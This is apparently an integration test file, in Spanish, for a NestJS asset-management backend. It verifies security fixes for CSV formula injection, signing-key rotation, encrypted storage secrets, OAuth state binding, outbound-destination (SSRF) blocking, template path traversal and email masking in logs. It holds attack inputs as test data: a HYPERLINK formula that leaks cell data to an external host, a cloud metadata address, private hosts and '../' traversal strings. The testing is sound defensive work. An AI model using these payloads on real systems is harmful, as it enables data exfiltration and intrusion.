// Hallazgos BE-10, BE-11 (almacenamiento), BE-12, BE-15, BE-16, BE-17 y Ley 1581 (logs de correo) con HTTP real y
// PostgreSQL real. La política de destinos salientes se fija como en producción antes de cargar la configuración.
import type { NestExpressApplication } from '@nestjs/platform-express';
import { Logger } from '@nestjs/common';
import { Test } from '@nestjs/testing';
import { createHash, randomUUID } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import request from 'supertest';
import { DataSource } from 'typeorm';
import { AppModule } from '../../src/app.module.js';
import { createAppValidationPipe } from '../../src/common/pipes/app-validation.pipe.js';
import { StorageSecretsAndOauthState1767225780000 } from '../../src/database/migrations/1767225780000-storage-secrets-and-oauth-state.js';
import { AssetMovement } from '../../src/modules/assets/entities/asset-movement.entity.js';
import { MovementType } from '../../src/modules/assets/enums/movement-type.enum.js';
import { AssetStateService } from '../../src/modules/assets/services/asset-state.service.js';
import { AssetsService } from '../../src/modules/assets/services/assets.service.js';
import { TokenService } from '../../src/modules/auth/services/token.service.js';
import { MovementsService } from '../../src/modules/movements/services/movements.service.js';
import { MailService } from '../../src/shared/mail/mail.service.js';
import { createActor, scalar, SHARED_STORAGE_DIR, useSharedStorage } from './helpers.js';

const PREVIOUS_MOVEMENT_SECRET = 'integration-previous-movement-secret';

vi.hoisted(() => {
  process.env['OUTBOUND_ALLOW_PRIVATE_NETWORKS'] = 'false';
  process.env['OUTBOUND_ALLOWED_HOSTS'] = 'relay.permitido.example';
  process.env['MOVEMENT_SIGNING_SECRET_PREVIOUS'] = 'integration-previous-movement-secret';
});

const TEMPLATE = 'templates/formats/OCI-01-55-v2.docx';
const sha256 = (value: string) => createHash('sha256').update(value).digest('hex');

describe('Endurecimiento BE-10/11/12/15/16/17 (HTTP real + PostgreSQL real)', () => {
  let app: NestExpressApplication;
  let dataSource: DataSource;
  const tokens: Record<string, string> = {};
  const actors: Record<string, string> = {};
  const http = () => request(app.getHttpServer());
  const auth = (who: string) => ({ Authorization: `Bearer ${tokens[who] ?? ''}` });

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile();
    app = moduleRef.createNestApplication<NestExpressApplication>();
    app.setGlobalPrefix('api/v1');
    app.useGlobalPipes(createAppValidationPipe());
    const cookieParser = (await import('cookie-parser')).default;
    app.use(cookieParser());
    await app.init();
    dataSource = app.get(DataSource);
    await useSharedStorage(dataSource);
    for (const [name, role] of [
      ['admin', 'SUPER_ADMIN'],
      ['director', 'INTERNAL_CONTROL_DIRECTOR'],
    ] as const) {
      const user = await createActor(dataSource);
      await dataSource.query(
        `INSERT INTO user_role (user_id, role_id, scope_type) SELECT $1, id, 'GLOBAL' FROM role WHERE code = $2`,
        [user.id, role],
      );
      actors[name] = user.id;
      tokens[name] = app.get(TokenService).signAccessToken({ ...user, sessionId: randomUUID() });
    }
  });

  afterAll(async () => {
    vi.restoreAllMocks();
    await dataSource.query(
      `UPDATE storage_settings SET driver = 'project', project_path = $1, s3_endpoint = NULL, s3_secret_key = NULL,
         google_client_id = NULL, google_client_secret = NULL, google_refresh_token = NULL,
         onedrive_client_secret = NULL, onedrive_refresh_token = NULL`,
      [SHARED_STORAGE_DIR],
    );
    await dataSource.query('UPDATE mail_settings SET host = NULL, enabled = FALSE');
    await app.close();
  });

  const assetWithMovement = async (reason: string, documentReference: string) => {
    const director = await createActor(dataSource);
    const categoryId = await scalar<string>(
      dataSource,
      `INSERT INTO asset_category (code, name, requires_photo) VALUES ($1, 'Categoría CSV', FALSE) RETURNING id`,
      [`IT_CSV_${randomUUID().slice(0, 6)}`],
    );
    const costCenterId = await scalar<string>(
      dataSource,
      `INSERT INTO cost_center (external_code, name) VALUES ($1, 'Centro CSV') RETURNING id`,
      [`IT-CSV-${randomUUID().slice(0, 6)}`],
    );
    const acquisitionTypeId = await scalar<string>(dataSource, `SELECT id FROM acquisition_type WHERE code = 'PURCHASE'`);
    const asset = await app
      .get(AssetsService)
      .create({ categoryId, costCenterId, acquisitionTypeId, description: 'Activo CSV', acquisitionDate: '2020-01-01' }, director);
    await app.get(AssetStateService).apply({
      assetId: asset.id,
      actorId: director.id,
      patch: {},
      movement: { type: MovementType.PhysicalVerification, reason, documentReference, executedAt: new Date('2021-01-01T12:00:00Z') },
    });
    const movementId = await scalar<string>(
      dataSource,
      `SELECT id FROM asset_movement WHERE asset_id = $1 AND reason = $2`,
      [asset.id, reason],
    );
    return { assetId: asset.id, movementId };
  };

  describe('BE-10: CSV de movimientos', () => {
    it('un motivo que empieza por = y una referencia que empieza por + salen neutralizados con comilla simple', async () => {
      const { assetId } = await assetWithMovement('=HYPERLINK("https://externo/?d="&A2,"Ver soporte")', '+573001234567');
      const response = await http()
        .get(`/api/v1/assets/${assetId}/movements/export`)
        .set(auth('director'))
        .buffer(true)
        .expect(200);
      const text = typeof response.text === 'string' ? response.text : Buffer.from(response.body as Buffer).toString();
      const row = text.split('\n').find((line) => line.includes('HYPERLINK'));
      expect(row).toContain(`"'=HYPERLINK(""https://externo/?d=""&A2,""Ver soporte"")"`);
      expect(row).toContain(",'+573001234567,");
    });
  });

  describe('BE-12: firmas de movimientos con clave anterior', () => {
    const resign = async (movementId: string, secret: string) => {
      const entity = await dataSource.getRepository(AssetMovement).findOneByOrFail({ id: movementId });
      const signature = (
        app.get(MovementsService) as unknown as { signatureOf(movement: AssetMovement, secret: string): string }
      ).signatureOf(entity, secret);
      const runner = dataSource.createQueryRunner();
      await runner.connect();
      try {
        await runner.query('SET session_replication_role = replica');
        await runner.query('UPDATE asset_movement SET event_signature = $2 WHERE id = $1', [movementId, signature]);
      } finally {
        await runner.query('SET session_replication_role = origin');
        await runner.release();
      }
    };

    it('un movimiento firmado con MOVEMENT_SIGNING_SECRET_PREVIOUS sigue verificando; con otra clave no', async () => {
      const { movementId } = await assetWithMovement(`Rotación ${randomUUID()}`, 'ROT-1');
      await resign(movementId, PREVIOUS_MOVEMENT_SECRET);
      const ok = await http().get(`/api/v1/movements/${movementId}/verify`).set(auth('director')).expect(200);
      expect(ok.body.data).toMatchObject({ valid: true, unsigned: false });
      await resign(movementId, 'clave-que-nadie-configuro');
      const bad = await http().get(`/api/v1/movements/${movementId}/verify`).set(auth('director'));
      expect(bad.body.error.code).toBe('MOVEMENT_TAMPERED');
      // La BD de integración es compartida (verifySample de movement-signature recorre activos al azar y allí no hay
      // clave anterior configurada): se deja firmado con la clave actual.
      await resign(movementId, process.env['MOVEMENT_SIGNING_SECRET'] ?? '');
    });

    it('los movimientos nuevos se firman con la clave actual, no con la anterior', async () => {
      const { movementId } = await assetWithMovement(`Actual ${randomUUID()}`, 'ROT-2');
      const entity = await dataSource.getRepository(AssetMovement).findOneByOrFail({ id: movementId });
      const service = app.get(MovementsService) as unknown as { signatureOf(movement: AssetMovement, secret: string): string };
      expect(entity.eventSignature).toBe(service.signatureOf(entity, process.env['MOVEMENT_SIGNING_SECRET'] ?? ''));
      expect(entity.eventSignature).not.toBe(service.signatureOf(entity, PREVIOUS_MOVEMENT_SECRET));
    });
  });

  describe('BE-11: credenciales de almacenamiento cifradas', () => {
    it('PATCH /storage/settings guarda los secretos con enc.v1. y el estado sigue respondiendo', async () => {
      await http()
        .patch('/api/v1/storage/settings')
        .set(auth('admin'))
        .send({ s3SecretKey: 's3-plano-123', googleClientId: 'cliente-google', googleClientSecret: 'GOCSPX-plano' })
        .expect(200);
      const [row] = (await dataSource.query(
        'SELECT s3_secret_key, google_client_secret FROM storage_settings',
      )) as Array<{ s3_secret_key: string; google_client_secret: string }>;
      expect(row?.s3_secret_key).toMatch(/^enc\.v1\./);
      expect(row?.google_client_secret).toMatch(/^enc\.v1\./);
      expect(JSON.stringify(row)).not.toContain('plano');
      const status = await http().get('/api/v1/storage/status').set(auth('admin')).expect(200);
      expect(status.body.data.googleClientId).toBe('cl****le');
    });

    it('un refresh token legado en claro se sella la primera vez que se lee', async () => {
      await dataSource.query(`UPDATE storage_settings SET google_refresh_token = '1//legado-en-claro'`);
      const status = await http().get('/api/v1/storage/status').set(auth('admin')).expect(200);
      expect(status.body.data.googleConnected).toBe(true);
      expect(await scalar<string>(dataSource, 'SELECT google_refresh_token FROM storage_settings')).toMatch(/^enc\.v1\./);
    });

    it('la migración es reversible: down() deja texto plano y up() vuelve a cifrar', async () => {
      const migration = new StorageSecretsAndOauthState1767225780000();
      const runner = dataSource.createQueryRunner();
      await runner.connect();
      try {
        await migration.down(runner);
        const plain = (await runner.query(
          'SELECT s3_secret_key, google_client_secret, google_refresh_token FROM storage_settings',
        )) as Array<Record<string, string>>;
        expect(plain[0]).toEqual({
          s3_secret_key: 's3-plano-123',
          google_client_secret: 'GOCSPX-plano',
          google_refresh_token: '1//legado-en-claro',
        });
        await migration.up(runner);
        const sealed = (await runner.query(
          'SELECT s3_secret_key, google_client_secret, google_refresh_token FROM storage_settings',
        )) as Array<Record<string, string>>;
        for (const value of Object.values(sealed[0] ?? {})) {
          expect(value).toMatch(/^enc\.v1\./);
        }
      } finally {
        await runner.release();
      }
      const status = await http().get('/api/v1/storage/status').set(auth('admin')).expect(200);
      expect(status.body.data.googleConnected).toBe(true);
    });
  });

  describe('BE-15: state OAuth de un solo uso y ligado al navegador', () => {
    const start = async () => {
      const response = await http().post('/api/v1/storage/oauth/google/start').set(auth('admin')).send({}).expect(200);
      const url = new URL(response.body.data.authorizationUrl as string);
      const cookies = ([] as string[]).concat(response.headers['set-cookie'] ?? []);
      const cookie = cookies.find((item) => item.startsWith('storage_oauth_binding='));
      return { state: url.searchParams.get('state') ?? '', cookie: cookie?.split(';')[0] ?? '', raw: cookie ?? '' };
    };
    const callback = (state: string, cookie?: string, provider = 'google') => {
      const req = http().get(`/api/v1/storage/oauth/${provider}/callback`).query({ code: 'codigo-de-google', state });
      return cookie ? req.set('Cookie', cookie) : req;
    };

    beforeAll(async () => {
      vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
        if (String(input) === 'https://oauth2.googleapis.com/token') {
          return new Response(JSON.stringify({ refresh_token: '1//token-de-google' }), { status: 200 });
        }
        throw new Error(`fetch inesperado: ${String(input)}`);
      });
      await dataSource.query(`UPDATE storage_settings SET driver = 'project', google_refresh_token = NULL`);
    });

    it('start fija una cookie HttpOnly SameSite=Lax con ruta del callback y guarda solo el hash del state', async () => {
      const { state, raw } = await start();
      expect(state).toMatch(/^[A-Za-z0-9_-]{43}$/);
      expect(raw).toMatch(/HttpOnly/i);
      expect(raw).toMatch(/SameSite=Lax/i);
      expect(raw).toMatch(/Path=\/api\/v1\/storage\/oauth/);
      const rows = (await dataSource.query('SELECT user_id, provider FROM storage_oauth_state WHERE state_hash = $1', [
        sha256(state),
      ])) as Array<{ user_id: string; provider: string }>;
      expect(rows).toEqual([{ user_id: actors['admin'], provider: 'google_drive' }]);
      expect(await scalar<number>(dataSource, 'SELECT count(*)::int FROM storage_oauth_state WHERE state_hash = $1', [state])).toBe(0);
    });

    it('sin la cookie del navegador que lo inició: 424 y el state queda gastado', async () => {
      const { state, cookie } = await start();
      const denied = await callback(state).expect(424);
      expect(denied.body.error.code).toBe('STORAGE_OAUTH_FAILED');
      await callback(state, cookie).expect(424);
      expect(await scalar<string>(dataSource, 'SELECT driver FROM storage_settings')).toBe('project');
    });

    it('con una cookie de otro navegador: 424', async () => {
      const first = await start();
      const second = await start();
      await callback(first.state, second.cookie).expect(424);
    });

    it('con cookie y state correctos conecta una vez; reutilizar el mismo state responde 424', async () => {
      const { state, cookie } = await start();
      const ok = await callback(state, cookie).expect(302);
      expect(ok.headers['location']).toMatch(/\/storage\?connected=google_drive$/);
      expect(([] as string[]).concat(ok.headers['set-cookie'] ?? []).join(';')).toMatch(/storage_oauth_binding=;/);
      const [row] = (await dataSource.query('SELECT driver, google_refresh_token, updated_by FROM storage_settings')) as Array<{
        driver: string;
        google_refresh_token: string;
        updated_by: string;
      }>;
      expect(row?.driver).toBe('google_drive');
      expect(row?.google_refresh_token).toMatch(/^enc\.v1\./);
      expect(row?.updated_by).toBe(actors['admin']);
      const replay = await callback(state, cookie).expect(424);
      expect(replay.body.error.code).toBe('STORAGE_OAUTH_FAILED');
      await dataSource.query(`UPDATE storage_settings SET driver = 'project', google_refresh_token = NULL`);
    });

    it('vencido, de otro proveedor o de un usuario inactivo: 424', async () => {
      const expired = await start();
      await dataSource.query(`UPDATE storage_oauth_state SET expires_at = NOW() - interval '1 second' WHERE state_hash = $1`, [
        sha256(expired.state),
      ]);
      await callback(expired.state, expired.cookie).expect(424);

      const other = await start();
      await callback(other.state, other.cookie, 'onedrive').expect(424);

      const inactive = await start();
      await dataSource.query(`UPDATE app_user SET status = 'SUSPENDED' WHERE id = $1`, [actors['admin']]);
      try {
        await callback(inactive.state, inactive.cookie).expect(424);
      } finally {
        await dataSource.query(`UPDATE app_user SET status = 'ACTIVE' WHERE id = $1`, [actors['admin']]);
      }
      expect(await scalar<string>(dataSource, 'SELECT driver FROM storage_settings')).toBe('project');
    });

    it('un state firmado como antes (JWT con el secreto de acceso) ya no sirve', async () => {
      const jwt = (await import('jsonwebtoken')).default;
      const legacy = jwt.sign(
        { typ: 'storage-oauth', provider: 'google_drive', userId: actors['admin'] },
        process.env['JWT_ACCESS_SECRET'] ?? '',
        { expiresIn: '10m' },
      );
      const { cookie } = await start();
      await callback(legacy, cookie).expect(424);
    });

    it('GET /storage ya no acuña authorizationUrl', async () => {
      await dataSource.query(`UPDATE storage_settings SET driver = 'google_drive', google_refresh_token = NULL`);
      const before = await scalar<number>(dataSource, 'SELECT count(*)::int FROM storage_oauth_state');
      const status = await http().get('/api/v1/storage').set(auth('admin')).expect(200);
      expect(status.body.data).toMatchObject({ needsOauth: true, authorizationUrl: null });
      expect(await scalar<number>(dataSource, 'SELECT count(*)::int FROM storage_oauth_state')).toBe(before);
      await dataSource.query(`UPDATE storage_settings SET driver = 'project'`);
    });
  });

  describe('BE-16: destinos salientes', () => {
    it.each([
      [{ host: '127.0.0.1', port: 5432 }],
      [{ host: 'gotenberg', port: 3000 }],
      [{ host: '169.254.169.254', port: 80 }],
      [{ host: 'localhost', port: 25 }],
    ])('PATCH /mail/settings %j responde 400 OUTBOUND_DESTINATION_FORBIDDEN', async (body) => {
      const response = await http().patch('/api/v1/mail/settings').set(auth('admin')).send(body).expect(400);
      expect(response.body.error.code).toBe('OUTBOUND_DESTINATION_FORBIDDEN');
      expect(JSON.stringify(response.body)).not.toContain(body.host);
    });

    it('un host de OUTBOUND_ALLOWED_HOSTS se acepta', async () => {
      const response = await http()
        .patch('/api/v1/mail/settings')
        .set(auth('admin'))
        .send({ host: 'relay.permitido.example', port: 25 })
        .expect(200);
      expect(response.body.data.host).toBe('relay.permitido.example');
    });

    it('un host privado guardado antes de la regla no se usa: probar la conexión responde 400 sin abrir el socket', async () => {
      await dataSource.query(`UPDATE mail_settings SET host = '127.0.0.1', port = 5432, from_email = 'noreply@unac.edu.co'`);
      const error = vi.spyOn(Logger.prototype, 'error').mockImplementation(() => undefined);
      const response = await http().post('/api/v1/mail/test-connection').set(auth('admin')).expect(400);
      error.mockRestore();
      expect(response.body.error.code).toBe('OUTBOUND_DESTINATION_FORBIDDEN');
    });

    it.each(['http://10.0.0.5:9000', 'http://127.0.0.1:9000', 'https://169.254.169.254', 'https://minio:9000'])(
      'PATCH /storage/settings con s3Endpoint %s responde 400',
      async (s3Endpoint) => {
        const response = await http().patch('/api/v1/storage/settings').set(auth('admin')).send({ s3Endpoint }).expect(400);
        expect(['OUTBOUND_DESTINATION_FORBIDDEN', 'VALIDATION_FAILED']).toContain(response.body.error.code);
        expect(await scalar<string | null>(dataSource, 'SELECT s3_endpoint FROM storage_settings')).toBeNull();
      },
    );
  });

  describe('BE-17: sgcVersion en la clave de la plantilla', () => {
    it.each(['../x', 'a/b', '1..2', '2 ', 'v2\u0000'])('sgcVersion %j responde 400', async (sgcVersion) => {
      const response = await http()
        .post('/api/v1/documents/formats/OCI-01-55/templates')
        .set(auth('director'))
        .field('effectiveDate', '2026-09-01')
        .field('sgcVersion', sgcVersion)
        .attach('file', await readFile(TEMPLATE), 'plantilla.docx');
      expect(response.status).toBe(400);
      expect(response.body.error.code).toBe('VALIDATION_FAILED');
    });

    it('una versión válida se guarda en la carpeta de su formato con un sufijo del servidor; otra carga no pisa el archivo', async () => {
      const upload = (file: string) =>
        http()
          .post('/api/v1/documents/formats/OCI-01-55/templates')
          .set(auth('director'))
          .field('effectiveDate', '2026-09-02')
          .field('sgcVersion', '2')
          .attach('file', file, 'plantilla.docx');
      const first = await upload(TEMPLATE).expect(201);
      const [row] = (await dataSource.query(
        'SELECT storage_key, file_hash FROM document_template_version WHERE id = $1',
        [first.body.data.id],
      )) as Array<{ storage_key: string; file_hash: string }>;
      expect(row?.storage_key).toMatch(/^document-templates\/OCI-01-55\/2026-09-02-v2-[0-9a-f-]{36}\.docx$/);
      // Misma fecha y versión con otro archivo: antes la clave era idéntica y el archivo se sobrescribía antes de que
      // la BD rechazara la fila (uq_document_template_version). Ahora el archivo registrado queda intacto.
      const second = await upload('templates/formats/OCI-01-65-v2.docx');
      expect(second.status).not.toBe(201);
      const stored = await readFile(join(SHARED_STORAGE_DIR, row?.storage_key ?? ''));
      expect(createHash('sha256').update(stored).digest('hex')).toBe(row?.file_hash);
    });
  });

  describe('Ley 1581: correos en logs', () => {
    it('sin SMTP, el aviso de respaldo del restablecimiento lleva el correo enmascarado', async () => {
      await dataSource.query('UPDATE mail_settings SET enabled = FALSE');
      const warn = vi.spyOn(Logger.prototype, 'warn').mockImplementation(() => undefined);
      await app.get(MailService).sendPasswordReset('lucia.mejia@unac.edu.co', 'token-restablecer');
      const logged = warn.mock.calls.flat().join(' ');
      warn.mockRestore();
      expect(logged).toContain('password-reset to=l***@unac.edu.co');
      expect(logged).not.toContain('lucia.mejia');
      expect(logged).not.toContain('token-restablecer');
    });
  });
});
